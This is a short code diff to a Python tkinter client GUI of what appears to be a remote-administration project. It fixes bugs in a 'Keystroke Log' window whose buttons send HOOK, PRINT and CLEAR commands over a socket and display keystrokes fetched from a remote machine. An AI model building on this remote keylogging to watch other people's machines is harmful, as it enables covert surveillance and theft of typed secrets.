@@ -5,7 +5,7 @@ from tkinter import ttk, filedialog, messagebox
 from PIL import Image, ImageTk
 import io
 from io import BytesIO
-import pynput.keyboard
+from pynput import keyboard
 import pynput.mouse
 from Process import Start, Kill, Process
 # import Keylog
@@ -31,7 +31,6 @@ class GUI:
         #     self.registryScene()
         elif data == "KEYLOG":
             self.keystrokeScene()
-            self.textbox = tk.Text(self)
         elif data == "PROCESS":
             self.processScene()
             
@@ -185,7 +184,7 @@ class GUI:
             #     self.client.send_data("START")
             #     view_start = Start(self.client)
             #     view_start.run()
-                self.startScene()
+            self.startScene()
                 
 
         def delete_click():
@@ -229,6 +228,7 @@ class GUI:
 
         key_window = tk.Tk()
         key_window.title("Keystroke Log")
+        self.textbox = tk.Text(self)
 
         def hook_click():
             self.client.Cli_Sock.send("HOOK".encode()) # Send the command to the server
@@ -238,11 +238,12 @@ class GUI:
 
         def print_click():
             self.client.Cli_Sock.send("PRINT".encode())
-            data = self.client.recv(5000).decode()
+            data = self.client.Cli_Sock.recv(5000).decode()
             print (data)
             self.textbox.insert(tk.END, data)
 
         def delete_click():
+            self.client.Cli_Sock.send("CLEAR".encode())
             self.textbox.delete("1.0", tk.END)
             
         # Buttons
